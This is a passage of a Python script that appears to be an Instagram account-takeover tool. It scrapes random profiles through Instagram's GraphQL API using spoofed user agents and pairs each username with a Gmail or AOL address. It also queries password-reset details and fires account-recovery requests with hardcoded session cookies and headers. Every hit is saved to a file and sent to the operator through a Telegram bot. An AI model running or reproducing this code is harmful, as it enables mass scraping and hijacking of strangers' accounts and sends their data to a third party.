            timeout=15
        ).json()
        return response.get('email', f"{EMOJI['fail']} Reset Not Available")
    except:
        return f"{EMOJI['fail']} Reset Not Available"

# Get Account Year
def get_account_year(pk):
    try:
        if pk == '?':
            return '?'
            
        pk = int(pk)
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
            (43464475395, 2020),
            (50289297647, 2021),
            (57464707082, 2022),
            (63313426938, 2023),
            (68900000000, 2024),
        ]
        for upper, year in ranges:
            if pk <= upper:
                return year
        return 2024
    except Exception:
        return '?'

# Save Account
def save_account(username, domain):
    with stats.lock:
        stats.total_hits += 1
    
    account_info = infoinsta.get(username, {})
    if account_info.get('follower_count', 0) < MIN_FOLLOWERS:
        return
    
    user_id = account_info.get('pk', '?')
    full_name = account_info.get('full_name', '?')
    followers = account_info.get('follower_count', '?')
    following = account_info.get('following_count', '?')
    posts = account_info.get('media_count', '?')
    bio = account_info.get('biography', '?')
    is_private = account_info.get('is_private', '?')
    is_verified = account_info.get('is_verified', '?')
    is_business = account_info.get('is_business', '?')
    creation_year = get_account_year(user_id)
    
    # Check if account is meta/business
    try:
        if followers and posts:
            if int(followers) >= 10 and int(posts) >= 2:
                meta = True
            else:
                meta = False
        else:
            meta = False
    except:
        meta = False
    
    info_text = f"""
‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©
{EMOJI['search']} ACCOUNT FOUND! {EMOJI['success']}

{EMOJI['user']}Username:@{username}
{EMOJI['email']}Email: {username}@{domain}
{EMOJI['link']} Profile:https://instagram.com/{username}

{EMOJI['stats']} Account Stats:
{EMOJI['follower']} Followers:{followers}
{EMOJI['following']}Following:{following}
{EMOJI['post']} Posts:{posts}
{EMOJI['year']}Created:{creation_year}

{EMOJI['lock']}Account Type:
{EMOJI['star']}Private: {'‚úÖ' if is_private else '‚ùå'}
{EMOJI['star']}Verified:{'‚úÖ' if is_verified else '‚ùå'}
{EMOJI['star']}Business: {'‚úÖ' if is_business else '‚ùå'}
{EMOJI['star']}Meta:{meta}

{EMOJI['bio']} Bio:{bio}

{EMOJI['link']} Reset Info: {get_reset_info(username)}

‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©‚ñ©
Tool by: @cyberrXrich
"""
    
    with open('praveen.txt', 'a', encoding='utf-8') as f:
        f.write(info_text + "\n")
    
    try:
        requests.get(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            params={
                'chat_id': input_id,
                'text': info_text,
                'parse_mode': 'HTML'
            },
            timeout=15
        )
    except Exception as e:
        print(f"{Colors.RED}{EMOJI['error']} Telegram Error: {e}{Colors.END}")

# Find Accounts
def find_accounts():
    while True:
        try:
            data = {
                'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                'variables': json.dumps({
                    'id': int(random.randrange(1000, 21254029834)),
                    'render_surface': 'PROFILE'
                }),
                'doc_id': '25618261841150840'
            }
            
            headers = {
                'x-fb-lsd': data['lsd'],
                'user-agent': generate_user_agent()
            }
            
            response = requests.post(
                'https://www.instagram.com/api/graphql',
                headers=headers,
                data=data,
                timeout=15
            )
            
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            
            if username and account.get('follower_count', 0) >= MIN_FOLLOWERS:
                infoinsta[username] = account
                check_instagram(username + GMAIL_DOMAIN)
                check_instagram(username + AOL_DOMAIN)
                
        except Exception:
            pass

# Password Reset Function
def password_reset(email):
    try:
        cookies = {
            'csrftoken': 'aaqCEBGUX8PHw-gDqKSq9u',
            'datr': 'HLXRZzl0x-UsyuAXPEUsRNj9',
            'ig_did': '474FA3BD-90DE-4FE2-B4A6-8F2F9B3AF08A',
            'dpr': '0.75',
            'mid': 'Z9G1HAALAAEElo051JjLfRpiIthw',
            'wd': '862x905'
        }
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'priority': 'u=1, i',
            'referer': 'https://www.instagram.com/accounts/password/reset/?source=fxcal',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-full-version-list': '"Chromium";v="134.0.6998.36", "Not:A-Brand";v="24.0.0.0", "Google Chrome";v="134.0.6998.36"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"14.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            'x-asbd-id': '359341',
            'x-csrftoken': 'aaqCEBGUX8PHw-gDqKSq9u',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-instagram-ajax': '1020819735',
            'x-requested-with': 'XMLHttpRequest',
            'x-web-device-id': '474FA3BD-90DE-4FE2-B4A6-8F2F9B3AF08A',
            'x-web-session-id': 'ewn39h:d0zkie:ng94k5'
        }
        
        data = {
            'email_or_username': email,
            'flow': 'fxcal',
            'jazoest': '21854'
        }
        
        response = requests.post(
            'https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/',
            cookies=cookies,
            headers=headers,
            data=data
        )
        
        if 'ok' in response.text:
            return f"{EMOJI['success']} Reset Email Sent!"
        else:
            return f"{EMOJI['fail']} Reset Failed!"
    except Exception as e:
        return f"{EMOJI['error']} Error: {str(e)}"

# Main Function
def main():
    # Check password
    
    
    # Get user input
    global ID, TOKEN, MIN_FOLLOWERS, THREAD_COUNT
    ID, TOKEN, MIN_FOLLOWERS, THREAD_COUNT = get_user_input()
    
    # Generate token
    generate_token()
    
    # Start threads
    print(f"{Colors.GREEN}{EMOJI['rocket']} Starting {THREAD_COUNT} threads...{Colors.END}")
    for _ in range(THREAD_COUNT):
        Thread(target=find_accounts).start()
    
    # Keep main thread alive
    while True:
        time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}{EMOJI['error']} Tool Stopped!{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}{EMOJI['error']} Critical Error: {e}{Colors.END}")
        sys.exit(1)